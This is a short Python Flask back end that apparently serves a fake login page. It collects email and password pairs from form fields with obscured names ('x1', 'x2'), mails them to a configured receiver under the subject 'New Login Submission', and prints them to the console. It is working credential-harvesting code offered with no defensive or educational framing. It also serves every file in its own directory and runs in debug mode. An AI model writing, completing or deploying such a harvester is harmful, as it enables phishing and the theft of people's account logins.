from flask import Flask, request, render_template, jsonify, send_from_directory
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os

app = Flask(__name__, static_folder='.', template_folder='.')

# Configuration
SENDER_EMAIL = os.environ.get("SENDER_EMAIL")
SENDER_PASSWORD = os.environ.get("SENDER_PASSWORD")
RECEIVER_EMAIL = os.environ.get("RECEIVER_EMAIL")

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/<path:filename>')
def serve_static(filename):
    return send_from_directory('.', filename)

@app.route('/submit', methods=['POST'])
def submit():
    email = request.form.get('x1')
    password = request.form.get('x2')

    if not email or not password:
        return jsonify({'message': 'Email and password are required'}), 400

    try:
        # Create the email
        msg = MIMEMultipart()
        msg['From'] = SENDER_EMAIL
        msg['To'] = RECEIVER_EMAIL
        msg['Subject'] = "New Login Submission"

        body = f"Email: {email}\nPassword: {password}"
        msg.attach(MIMEText(body, 'plain'))

        # Send the email
        # Note: This example uses Gmail's SMTP server. Change if using another provider.
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(SENDER_EMAIL, SENDER_PASSWORD)
            server.send_message(msg)

        print(f"Email sent: {email} / {password}")
        return jsonify({'message': 'Success'}), 200

    except Exception as e:
        print(f"Error sending email: {e}")
        return jsonify({'message': f'Failed to send email: {str(e)}'}), 500

if __name__ == '__main__':
    app.run(debug=True, port=5000)
